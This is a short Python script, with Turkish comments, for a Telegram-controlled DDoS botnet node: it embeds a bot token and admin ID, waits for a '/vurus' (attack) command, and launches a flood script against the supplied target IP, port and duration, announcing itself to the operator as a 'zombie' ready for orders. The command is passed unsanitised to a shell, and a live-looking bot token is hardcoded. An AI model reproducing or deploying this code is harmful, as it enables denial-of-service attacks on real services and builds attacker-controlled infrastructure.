import telebot
import os
import subprocess

# --- SENİN BİLGİLERİN ---
TOKEN = "8818747282:AAGHb-qVWw-4eCZiFCEx1MC3h7OnoXeNLtI"
ADMIN_ID = 2019064003

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['vurus'])
def attack(message):
    if message.from_user.id == ADMIN_ID:
        try:
            # Örn: /vurus 1.1.1.1 80 60
            args = message.text.split()
            target = args[1]
            port = args[2]
            duration = args[3]
            
            # Buraya kendi vuruş scriptinin adını yaz kanka (Örn: flood.py)
            # Eğer vuruş scriptin de yanındaysa onu ateşler
            subprocess.Popen(f"python3 flood.py {target} {port} {duration}", shell=True)
        except:
            pass

# Zombi ilk açıldığında komutana selam çakıyor
try:
    bot.send_message(ADMIN_ID, "🧟 Zombi hazır usta! Emirlerini bekliyorum.")
except:
    pass

bot.infinity_polling()
